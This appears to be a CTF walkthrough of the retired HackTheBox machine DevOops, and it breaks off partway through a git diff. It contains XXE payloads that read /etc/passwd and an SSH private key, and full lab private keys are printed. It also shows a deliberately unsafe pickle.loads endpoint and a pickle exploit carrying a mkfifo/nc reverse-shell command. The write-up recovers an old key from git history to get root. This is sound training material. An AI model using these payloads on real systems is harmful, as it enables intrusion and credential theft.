---
Category: B2R
Difficulty: Medium
Platform: HackTheBox
Retired: true
Status: 3. Complete
Tags:
  - XXE-Injection
  - bash-history
  - credentials-reuse
  - git
  - git-privesc
  - pickle-deserialization
  - Linux
---
# Resolution summary

>[!summary]
>- Web application running on port 5000 is vulnerable to **XML External Entity Injection** (XXE Injection)
>- XXE allowed to **leak roosa SSH private key** and get user access to the machine
>	- Route 2: Using XXE it was possible to leak the [feed.py](http://feed.py/) source code and find an endpoint vulnerable to pickle deserialization.
>- Enumeration of roosa **bash history** allowed to identify an **old SSH key committed with git** and then replaced. Leaking the old SSH key it was possible to re-use it and gain root access to the box

## Improved skills

- Exploiting XXE Injection
- (optional) Exploiting insecure deserialization against pickle
- Enumerate old git commits in search of sensitive data

## Used tools

- nmap
- gobuster
- burpsuite

---

# Information Gathering

Scanned all TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/DevOops]
└─$ sudo nmap -sS -p- -oN scans/all-tcp-ports.txt -v -Pn 10.10.10.91
...
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Enumerated open TCP ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/DevOops]
└─$ sudo nmap -sT -sC -sV -A -p22,5000 -oN scans/open-tcp-ports.txt -Pn 10.10.10.91
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.18 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 4.10 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.10 (92%), Linux 3.8 - 4.14 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...
```

# Enumeration

## Port 5000 - HTTP (Gunicorn 19.7.1)

Browsed port 5000:

![Pasted image 20210527155049.png](../../zzz_res/attachments/Pasted_image_20210527155049.png)

Enumerated web directories and files:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/DevOops]
└─$ gobuster dir -u http://10.10.10.91:5000 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o scans/p5000-files_py_asp.txt -t20 -x py,asp
...
/feed                 (Status: 200) [Size: 546263]
/upload               (Status: 200) [Size: 347]
```

Browsed **/upload** directory:

![Pasted image 20210527155833.png](../../zzz_res/attachments/Pasted_image_20210527155833.png)

Uploaded a test .txt file:

![Pasted image 20210527160610.png](../../zzz_res/attachments/Pasted_image_20210527160610.png)

![Pasted image 20210527160619.png](../../zzz_res/attachments/Pasted_image_20210527160619.png)

Uploaded a test .xml file:

```xml
<?xml version="1.0"?>
<Company>
	<Author>Test1</Author>
	<Subject>Test2</Subject>
	<Content>Test3</Content>
</Company>
```

![Pasted image 20210527161137.png](../../zzz_res/attachments/Pasted_image_20210527161137.png)

# Exploitation

## XML External Entity Injection (XXE Injection)

Payload sent to the server:

```xml
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<Company>
<Author>&xxe;</Author>
<Subject>Test2</Subject>
<Content>Test3</Content>
</Company>
```

Server response disclosed **/etc/passwd**:

![Pasted image 20210527162146.png](../../zzz_res/attachments/Pasted_image_20210527162146.png)

### Dumping roosa SSH private key (#1)

```xml
<!DOCTYPE foo [ <!ELEMENT foo ANY >

<!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa" >]>
<Company>
<Author>&xxe;</Author>
<Subject>Test2</Subject>
<Content>Test3</Content>
</Company>
```

![Pasted image 20210527162322.png](../../zzz_res/attachments/Pasted_image_20210527162322.png)

Logged in using roosa key:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/DevOops/loot]
└─$ echo '-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----' > roosa.key

┌──(kali㉿kali)-[~/…/HTB/box/DevOops/loot]
└─$ chmod 500 roosa.key

┌──(kali㉿kali)-[~/…/HTB/box/DevOops/loot]
└─$ ssh roosa@10.10.10.91 -i roosa.key
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.13.0-37-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

135 packages can be updated.
60 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

roosa@gitter:~$ whoami && hostname
roosa
gitter
```

### Pickle deserialization in /newpost (#2)****

Using the XXE vulnerability to read feed.py reveals a /newpost route in the Python web application which accepts POST data and is vulnerable to pickle deserialization.

```python
def uploaded_file(filename):
    return send_from_directory(Config.UPLOAD_FOLDER,
                               filename)

@app.route("/")
def xss():
    return template('index.html')

@app.route("/feed")
def fakefeed():
   return send_from_directory(".","devsolita-snapshot.png")

@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']

## TODO: VERY important! DISABLED THIS IN PRODUCTION
#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')

if __name__ == "__main__":
  app.run(host='0.0.0,0', Debug=True)
```

PoC for `pickle.loads()` deserialization RCE:

[Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

Exploit:

```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

# Privilege Escalation

## Local enumeration

sudo enumeration:

```bash
Sudo version 1.8.16

roosa@gitter:~$ sudo -l
sudo: unable to resolve host gitter: Connection timed out
```

User enumeration:

```bash
roosa@gitter:~$ ls /home/
blogfeed  git  lost+found  osboxes  roosa

roosa@gitter:~$ cat /etc/passwd | grep -vE 'nologin|false'
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
git:x:1001:1001:git,,,:/home/git:/bin/bash
roosa:x:1002:1002:,,,:/home/roosa:/bin/bash

roosa@gitter:~$ id
uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
```

Local service:

```bash
roosa@gitter:/srv/git/blogfeed.git$ netstat -polentau
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode       PID/Program name Timer
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          22343       -                off (0.00/0/0)
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      0          24899       -                off (0.00/0/0)
tcp        0      0 0.0.0.0:5000            0.0.0.0:*               LISTEN      1002       22745       1285/python      off (0.00/0/0)
tcp        0      0 10.10.10.91:22          10.10.14.8:44770        ESTABLISHED 0          520627      -                keepalive (6250.96/0/0)
tcp        0    636 10.10.10.91:22          10.10.14.8:44740        ESTABLISHED 0          431956      -                on (0.12/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      0          22352       -                off (0.00/0/0)
tcp6       0      0 ::1:631                 :::*                    LISTEN      0          24898       -                off (0.00/0/0)
udp        0      0 0.0.0.0:34324           0.0.0.0:*                           111        18896       -                off (0.00/0/0)
udp        0      0 10.10.10.91:44599       10.10.10.2:53           ESTABLISHED 100        561241      -                off (0.00/0/0)
udp        0      0 0.0.0.0:631             0.0.0.0:*                           0          24909       -                off (0.00/0/0)
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           111        18894       -                off (0.00/0/0)
udp        0      0 10.10.10.91:59714       10.10.10.2:53           ESTABLISHED 105        561169      -                off (0.00/0/0)
udp        0      0 10.10.10.91:49990       10.10.10.2:53           ESTABLISHED 105        561170      -                off (0.00/0/0)
udp6       0      0 :::5353                 :::*                                111        18895       -                off (0.00/0/0)
udp6       0      0 :::34568                :::*                                111        18897       -                off (0.00/0/0)
```

git version:

```bash
git@gitter:~$ git --version
git version 2.7.4
```

linpeas.sh system info:

```bash
[+] Operative system
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
Linux version 4.13.0-37-generic (buildd@lcy01-amd64-019) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.9)) #42~16.04.1-Ubuntu SMP Wed Mar 7 16:02:25 UTC 2018
Distributor ID: Ubuntu
Description:    Ubuntu 16.04.4 LTS
Release:        16.04
Codename:       xenial

[+] CPU info
Architecture:          i686
CPU op-mode(s):        32-bit, 64-bit
Byte Order:            Little Endian
CPU(s):                1
On-line CPU(s) list:   0
Thread(s) per core:    1
Core(s) per socket:    1
Socket(s):             1
Vendor ID:             AuthenticAMD
```

USBCreator

```bash
[+] USBCreator
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
Vulnerable!!
```

New SSH creds found:

```bash
Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
/home/roosa/deploy/resources/integration/authcredentials.key
/home/roosa/.ssh/id_rsa
/home/roosa/work/blogfeed/resources/integration/authcredentials.key
```

Leaked private SSH keys:

```bash
roosa@gitter:~$ cat /home/roosa/work/blogfeed/resources/integration/authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
23g18kmkjmzWQ2AjDeC0EyWH3k4iRnABruBHs8+fssjW5sSxze74d7Ez3uOI9zPE
sQ26ynmLutnd/MpyxFjCigP02McCBrNLaclcbEgBgEn9v+KBtUkfgMgt5CNLfV8s
ukQs4gdHPeSj7kDpgHkRyCt+YAqvs3XkrgMDh3qI9tCPfs8jHUvuRHyGdMnqzI16
ZBlx4UG0bdxtoE8DLjfoJuWGfCF/dTAFLHK3mwIDAQABAoIBADelrnV9vRudwN+h
LZ++l7GBlge4YUAx8lkipUKHauTL5S2nDZ8O7ahejb+dSpcZYTPM94tLmGt1C2bO
JqlpPjstMu9YtIhAfYF522ZqjRaP82YIekpaFujg9FxkhKiKHFms/2KppubiHDi9
oKL7XLUpSnSrWQyMGQx/Vl59V2ZHNsBxptZ+qQYavc7bGP3h4HoRurrPiVlmPwXM
xL8NWx4knCZEC+YId8cAqyJ2EC4RoAr7tQ3xb46jC24Gc/YFkI9b7WCKpFgiszhw
vFvkYQDuIvzsIyunqe3YR0v8TKEfWKtm8T9iyb2yXTa+b/U3I9We1P+0nbfjYX8x
6umhQuECgYEA0fvp8m2KKJkkigDCsaCpP5dWPijukHV+CLBldcmrvUxRTIa8o4e+
OWOMW1JPEtDTj7kDpikekvHBPACBd5fYnqYnxPv+6pfyh3H5SuLhu9PPA36MjRyE
4+tDgPvXsfQqAKLF3crG9yKVUqw2G8FFo7dqLp3cDxCs5sk6Gq/lAesCgYEAyiS0
937GI+GDtBZ4bjylz4L5IHO55WI7CYPKrgUeKqi8ovKLDsBEboBbqRWcHr182E94
SQMoKu++K1nbly2YS+mv4bOanSFdc6bT/SAHKdImo8buqM0IhrYTNvArN/Puv4VT
Nszh8L9BDEc/DOQQQzsKiwIHab/rKJHZeA6cBRECgYEAgLg6CwAXBxgJjAc3Uge4
eGDe3y/cPfWoEs9/AptjiaD03UJi9KPLegaKDZkBG/mjFqFFmV/vfAhyecOdmaAd
i/Mywc/vzgLjCyBUvxEhazBF4FB8/CuVUtnvAWxgJpgT/1vIi1M4cFpkys8CRDVP
6TIQBw+BzEJemwKTebSFX40CgYEAtZt61iwYWV4fFCln8yobka5KoeQ2rCWvgqHb
8rH4Yz0LlJ2xXwRPtrMtJmCazWdSBYiIOZhTexe+03W8ejrla7Y8ZNsWWnsCWYgV
RoGCzgjW3Cc6fX8PXO+xnZbyTSejZH+kvkQd7Uv2ZdCQjcVL8wrVMwQUouZgoCdA
qML/WvECgYEAyNoevgP+tJqDtrxGmLK2hwuoY11ZIgxHUj9YkikwuZQOmFk3EffI
T3Sd/6nWVzi1FO16KjhRGrqwb6BCDxeyxG508hHzikoWyMN0AA2st8a8YS6jiOog
bU34EzQLp7oRU/TKO6Mx5ibQxkZPIHfgA1+Qsu27yIwlprQ64+oeEr0=
-----END RSA PRIVATE KEY-----
```

## SSH key reuse

Enumerated roosa history:

```python
roosa@gitter:~$ cat .bash_history
ssh-keygen --help
ssh-keygen
ls -altr .ssh/
cat .ssh/id_rsa.pub
nano /etc/host
nano /etc/hostname
sudo nano /etc/hostname
exit
nano .ssh/id_rsa.pub
exit
ssh git@localhost
exit
ssh git@localhost
clear
apt-get upgrade
exit
ls -altr
mkdir work
cd work
mkdir blogfeed
git init
git add .
git commit -m 'initial commit'
git config --global user.email "roosa@solita.fi"
git config --global user.name "Roosa Hakkerson"
git commit -m 'initial commit'
nano README-MD
nano README-md
nano README.md
git add README.md
git commit -m 'initial commit'
git remote add origin git@localhost:/srv/git/blogfeed.git
git push origin master
exit
ps -Af
kill 27499
exit
sudo su -
exit
groups
exit
git push origin master
cd work/blogfeed/
git push origin master
cd ..
cd blogfeed/
cd ..
git add README.md
git commit -m 'Initial commit'
git push
git log
ls
mkdir src
mkdir resources
cd resources
mkdir integration
mkdir integration/auth_credentials.key
nano integration/auth_credentials.key/
ls -altr
chmod go-rwx authcredentials.key
ls -atlr
cd ..
ls -altr
chmod -R o-rwx .
ls -altr
ls resources/
ls resources/integration/
ls -altr resources/
ls -altr resources/integration/
rm -Rf resources/integration/auth_credentials.key
mv resources/authcredentials.key resources/integration/
git add resources/integration/authcredentials.key
git commit -m 'add key for feed integration from tnerprise backend'
ls -altr resources/integration/
git push
ssh-keygen
ös -altr
ls .altr
ls -altr
cat kak
cp kak resources/integration/authcredentials.key
git add resources/integration/authcredentials.key
git commit -m 'reverted accidental commit with proper key'
git push
ls -altr
rm kak
rm kak.pub
git log
ls -altr
emacs src/feed.py
nano src/feed.py
nano src/feed.py
cd src/
ls -altr
nano index.html
nano upload.html
less feed.py
fg
fgg
nano feed.py
ls -altr
cd ..
ls -altr
git status
git add run-gunicorn.sh
nano run-gunicorn.sh
git add run-gunicorn.sh
git commit -m 'Gunicorn startup script'
git push
git add src/feed.py
git add src/upload.html
git add src/index.html
git commit -m 'Blogfeed app, initial version.'
git push
git log
nano src/feed.py
ifconfig
ls ..
ls -altr ~
cat ~/.wget-hsts
cat ~/.gitconfig
cat ~/examples.desktop
ls -altr ~
cat ~/.bash_history
cat run-gunicorn.sh
chmod u+x run-gunicorn.sh
./run-gunicorn.sh
ls -altr
cat feed.log
nano src/feed.py
cd src/
../run-gunicorn.sh
ls -altr
ifconfig
python -m SimpleHTTPServer
../run-gunicorn.sh
ls -altr
rm access.log
rm feed.log
ls -atlr
rm blagpost-xxe.xml
cd ..
ls -altr
rm access.log
rm feed.log
ls -altr
cd src
nano feed.py
../run-gunicorn.sh
ps -Af
ps
../run-gunicorn.sh
ls
cat feed.log
fg
nano feed.py
fg
nano feed.
nano feed.py
../run-gunicorn.sh
less feed.
less feed.log
../run-gunicorn.sh
export WERKZEUG_DEBUG_PIN=12345
../run-gunicorn.sh
nano config.py
nano feed.
nano feed.py
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
cccfg
fg
../run-gunicorn.sh
nano config.py
fg
nano feed.py
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
less config.py
nano config.py
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
less ../run-gunicorn.sh
cat ../run-gunicorn.sh
nano app.py
emacs app.py
xemacs app.py
emacs app.py
cat ../run-gunicorn.sh
emacs feed.py
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
ls -altr
git add feed.py
git status
git diff ../run-gunicorn.sh
ls -altr ..
git add ../run-gunicorn.sh
git commit -m 'Debug support added to make development more agile.'
git push
ls -altr
git log
ls -altr
ls -latr
cd ..
ls -altr
cd .git
ls -altr
cd ..
cd src
../run-gunicorn.sh
ls -altr
cd ..
cat run-gunicorn.sh
emacs run-gunicorn.sh
../run-gunicorn.sh
fg
emacs feed.py
../run-gunicorn.sh
git status
git add feed.py
cat ../run-gunicorn.sh
git add ../run-gunicorn.sh
git commit -m 'Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.'
git push
git log
cat ../run-gunicorn.sh
../run-gunicorn.sh
set | grep DEB
fg
cat ../run-gunicorn.sh
../run-gunicorn.sh
top
ls -altr
emacs index.html
../run-gunicorn.sh
fg
emacs index.html
../run-gunicorn.sh
fg
emacs feed.py
emacs index.html
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
emacs index.html
../run-gunicorn.sh
ps -Af
kill 26593
ps -Af
kill -9 26593
kill -9 26594
ls -altr
emas ../run-gunicorn.sh
emacs ../run-gunicorn.sh
emacs feed.
emacs feed.py
fg
emacs feed.py
python
cat save.p
fg
emacs feed.py
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
fg
../run-gunicorn.sh
cat /etc/passwd
sudo su -
groups
sudo su -
exit
fg
exit
sudo su -
clear
ls -altr
exit
set|grep DEB
cd work/blogfeed/src/
cat ../run-gunicorn.sh
../run-gunicorn.sh
cat ../run-gunicorn.sh
export WERKZEUG_DEBUG_PIN=15123786
emacs ../run-gunicorn.sh
export WERKZEUG_DEBUG_PIN=151237
cat ../run-gunicorn.sh
../run-gunicorn.sh
emacs ../run-gunicorn.sh
export WERKZEUG_DEBUG_PIN=151237652
../run-gunicorn.sh
fg
emacs feed.py
cat ../run-gunicorn.sh
fg
cat ../run-gunicorn.sh
../run-gunicorn.sh
export FLASK_DEBUG=1
../run-gunicorn.sh
python feed.py
flask run
emacs feed.
fg
export FLASK_HOST=0.0.0.0
emacs feed.
flask run
flask --help
fg¨
emacs feed.py
emacs ../run-gunicorn.sh
emacs feed.py
../run-gunicorn.sh
```

Sorted history:

```bash
roosa@gitter:~$ cat .bash_history | sort -u
...
git add src/feed.py
git add src/index.html
git add src/upload.html
git commit -m 'add key for feed integration from tnerprise backend'
git commit -m 'Blogfeed app, initial version.'
git commit -m 'Debug support added to make development more agile.'
git commit -m 'Gunicorn startup script'
git commit -m 'initial commit'
git commit -m 'Initial commit'
git commit -m 'reverted accidental commit with proper key'
git commit -m 'Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.'
git config --global user.email "roosa@solita.fi"
git config --global user.name "Roosa Hakkerson"
git diff ../run-gunicorn.sh
git init
git log
git log
git push
git push origin master
git remote add origin git@localhost:/srv/git/blogfeed.git
git status
...
sudo nano /etc/hostname
sudo su -
top
xemacs app.py
```

Identified .git folder:

```bash
roosa@gitter:~$ find /home/ -name ".git" 2>/dev/null
/home/roosa/work/blogfeed/.git
```

Leaked the old SSH key:

```bash
roosa@gitter:~/work/blogfeed$ git show -1 resources/integration/authcredentials.key
commit 33e87c312c08735a02fa9c796021a4a3023129ad
Author: Roosa Hakkerson <roosa@solita.fi>
Date:   Mon Mar 19 09:33:06 2018 -0400

    reverted accidental commit with proper key

diff --git a/resources/integration/authcredentials.key b/resources/integration/authcredentials.key
index 44c981f..f4bde49 100644
--- a/resources/integration/authcredentials.key
+++ b/resources/integration/authcredentials.key
@@ -1,28 +1,27 @@
 -----BEGIN RSA PRIVATE KEY-----
-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
+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
